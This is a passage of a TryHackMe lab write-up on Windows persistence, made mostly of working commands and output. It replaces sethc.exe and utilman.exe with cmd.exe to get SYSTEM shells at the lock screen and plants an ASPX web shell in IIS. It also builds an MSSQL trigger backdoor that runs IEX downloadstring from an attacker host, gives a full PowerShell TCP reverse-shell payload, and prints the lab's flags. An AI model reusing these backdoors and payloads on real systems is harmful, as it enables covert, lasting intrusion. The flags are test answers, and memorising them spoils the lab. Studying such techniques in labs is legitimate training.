![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49969 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

11. `C:\flags\flag13.exe` from the reverse shell on our attack machine to run the **flag13.exe** program, which ended up containing this task's flag and displaying it onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag13.exe
C:\flags\flag13.exe
THM{USER_TRIGGERED_PERSISTENCE_FTW}
```


# Backdooring the Login Screen / RDP

## Stickey Keys

1. Started this room's machine
2. `takeown /f c:\Windows\System32\sethc.exe` from the compromised Windows machine to take ownership, which we're doing as Administrator, of the **sethc.exe** (Secure Attention Sequence Even Handler Controller) program, which is associated with the Stickey Keys feature in Windows that you can activate by pressing the **SHIFT** key on a keyboard five times if it's active
```PowerShell
C:\Users\Administrator>takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "WPERSISTENCE\Administrator".
```
3. `icacls C:\Windows\System32\sethc.exe /grant Administrator:F` from the compromised Windows machine to grant the Administrator full control to the **sethc.exe** program, which allowed us to modify the executable binary that will execute after activating Sticky Keys by pressing the **SHIFT** key on our keyboard five times
```PowerShell
C:\Users\Administrator>icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files
```
4. `copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe` from the compromised Windows machine to replace the **sethc.exe** file with the **cmd.exe** file so that when the user activates Sticky Keys, it'll execute the **cmd.exe** program instead, which will launch the compromised Windows machine's command prompt that we'll use to execute the **flag14.exe** program 
```PowerShell
C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): Yes
        1 file(s) copied.
```
5. After successfully executing the preceding commands, we'll lock our screen and then active Sticky Keys by pressing **SHIFT** five times on our keyboard, which ended up opening a command prompt with SYSTEM privileges

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt.2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt.3.png) 

6. `C:\flags\flag14.exe` from our open command promp on the compromised Windows machine's lockscreen to execute the **flag14.exe** program, which ended up displaying the flag for this task onto our terminal 
```PowerShell
C:\Windows\system32>C:\flags\flag14.exe
THM{BREAKING_THROUGH_LOGIN}
```


#
## Utilman

1. Started this room's machine
2. `takeown /f c:\Windows\System32\utilman.exe` from the compromised Windows machine to take ownership of, which we're doing as Administrator, the **utilman.exe** (Utility Manager) program, which is responsible for managing various accessibility features and utilities in Windows, such as Windows' **Ease of Access** options during the lockscreen
```PowerShell
C:\Users\Administrator>takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "WPERSISTENCE\Administrator".
```
3. `icacls C:\Windows\System32\utilman.exe /grant Administrator:F` from the compromised Windows machine to grant the Administrator full control to the **utilman.exe** program, which allowed us to modify the executable binary that will execute after acessing the **Ease of Access** options during the compromised Windows machine's lockscreen
```PowerShell
C:\Users\Administrator>icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files
```
4. `copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe` from the compromised Windows machine to replace the **utilman.exe** file with the **cmd.exe** file so that a command prompt will open up when pressing on the **Ease of Access** option at the compromised machine's lockscreen instead of the **utilman** being executed 
```PowerShell
C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): Yes
        1 file(s) copied.
```
5. After successfully executing the previous commands, we locked our screen and then click on the "**Ease of Access**" button, which ended up opening up a command prompt with SYSTEM privileges that verified by executing the`whoami` command, which was the case

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Sticky%20Keys%20pt.2.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Utilman%20pt2.png)

7. `C:\flags\flag15.exe` from our open command promp on the compromised Windows machine's lockscreen to execute the **flag15.exe** program, which ended up displaying the flag for this task onto our terminal 
```PowerShell
C:\Windows\system32>C:\flags\flag15.exe
THM{THE_LOGIN_SCREEN_IS_MERELY_JUST_A_SUGGESTION}
```


# Persisting Through Existing Services

## Using Web Shells

1. Started this room's machine
2. `firefox <URL>` from our Linux attack machine to launch Firefox and redirect it to the ASP.NET web shell Github repository, which we'll then download onto our attack machine 
```Bash
root@ip-10-10-32-42:~# firefox https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Firefox%20cmdaspx.net%20Github.png)

3. `sudo python -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow our compromised machine to connect back to our attack machine and download the ASP.NET web shell file that we just downloaded from Github
```Bash
root@ip-10-10-32-42:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
4. `(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<ASPX.NET WEB SHELL FILE1>','<ASPX.NET WEB SHELL FILE2>.exe')` from our compromised Windows machine to download the ASP.NET web shell file from our attack machine and save it onto this machine with a different name
```PowerShell
PS C:\Users\Administrator> (New-Object System.Net.WebClient).Downloadfile('http://10.10.32.42:8000/cmdasp.aspx','shell.aspx')
```
5. `dir` from our compromised Windows machine to display the files and directories of our current working directory onto our terminal to verify if the ASP.NET web shell file was successfully downloaded from our attack machine, which it was
```PowerShell
PS C:\Users\Administrator> dir
    Directory: C:\Users\Administrator
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   9:00 PM          20216 shell.aspx
```
6. `icacls <ASPX.NET WEB SHELL FILE PATH> /grant Everyone:F` from our compromised Windows machine to grant all the users in the system full access and control to the ASP.NET web shell file that we just downloaded from our attack machine
```PowerShell
PS C:\Users\Administrator> icacls shell.aspx /grant Everyone:F
processed file: shell.aspx
Successfully processed 1 files; Failed processing 0 files
```
7. `move <FILE> <DESTINATION PATH>` from our compromised Windows machine to move the <ASPX.NET WEB SHELL FILE2> web shell file to the **C:\inetpub\wwwroot** directory, which is the default directory where web content is stored for the IIS (Internet Information Services) web server, which is a web server software that was developed by Microsoft for Windows that provides the infrastructure and services necessary to host and manage websites, web applications, and other web services
```PowerShell
PS C:\Users\Administrator>move shell.aspx C:\inetpub\wwwroot\
        1 file(s) moved.
```
8. `explorer.exe "http://<TARGET IP>/shell.aspx"` from our compromised Windows machine to launch the Windows Explorer web browser and redirect it to our ASP.NET web shell, which brought us to a web shell that used to run commands on the system 
```PowerShell
PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Open.png)

9. `C:\flags\flag16.exe` from our compromised Windows machine's web shell to run the **flag16.exe**, which ended up displaying this task's flag onto our web shell terminal 

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/ASPX.NET%20Web%20Shell%20Flag.png)


#
## Using MSSQL as a Backdoor

1. Started this room's machine
2. Search for Microsoft's **Microsoft SQL Server Management Studio 18**, launch it, and then press connect to start using it

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Search.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt2.png)

3. Once the MSSQL Serve Manager has successfully been launched, execute the following four queries:

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt.3.png)

The first query we'll execute is to enable the **xp_cmdshell** stored procedure, which is a procedure that's provided and disabled by default in any MSSQL installation, and allows us to run commands directly in the system's console
```SQL
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%201.png)

The second query we'll execute is to ensure that any website and any user accessing the database can run **xp_cmdshell** by granting privileges to all users to impersonate the **sa** (system administrator) user, which is the default database administrator, since only database users with the **sysadmin** role can run the **xp_cmdshell** procedure by default
```SQL
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%202.png)

The third query we'll execute is to specify and switch to the database that we want to execute the fourth query in, which was the **HRDB** database
```SQL
USE HRDB
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%203.png)

The fourth and last query we'll execute is to configure a trigger that'll download a PowerShell script that we'll create on our attack machine from our attack machine and then execute it whenever an **INSERT** action is made into the **HRDB** database's **Employees** table
```SQL
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ATTACK MACHINE IP>:8000/<POWERSHELL SCRIPT>.ps1'')"';
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%204.png)

4. `mousepad <POWERSHELL SCRIPT>.ps1` from our Linux attack machinea and insert the following reverse shell PowerShell payload inside 
```PowerShell
$client = New-Object System.Net.Sockets.TCPClient("<ATTACK MACHINE IP>",<PORT NUMBER>);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Creating%20evilscript.ps1.png)

5. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connections
```Bash
root@ip-10-10-32-42:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
6. `sudo python -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow our compromised Windows machine to connect to our attack machine and download the payload that we just created once the trigger we had set up gets triggered
```Bash
root@ip-10-10-32-42:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
7. `explorer.exe http://<TARGET IP>/` from the compromised Windows machine to launch the Windows Explorer web browser and redirect it to the target's IP address, which brought us to a web page from where we can add users into the target's HRDB database to trigger the trigger that we inserted using their MSSQL Server Manager, which ended up working after doing so and creating a reverse shell that connected back to our attack machine's netcat listener that we just had previously set up
```PowerShell
C:\Users\Administrator>explorer.exe "http://10.10.138.69/"
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Insert%20Data%20pt1.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Insert%20Data%20pt2.png)

```Bash
root@ip-10-10-32-42:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.138.69 49758 received!
```

8. `C:\flags\flag17.exe` from the reverse shell to run the **flag17.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
PS C:\Windows\system32> C:\flags\flag17.exe
THM{I_LIVE_IN_YOUR_DATABASE}
```

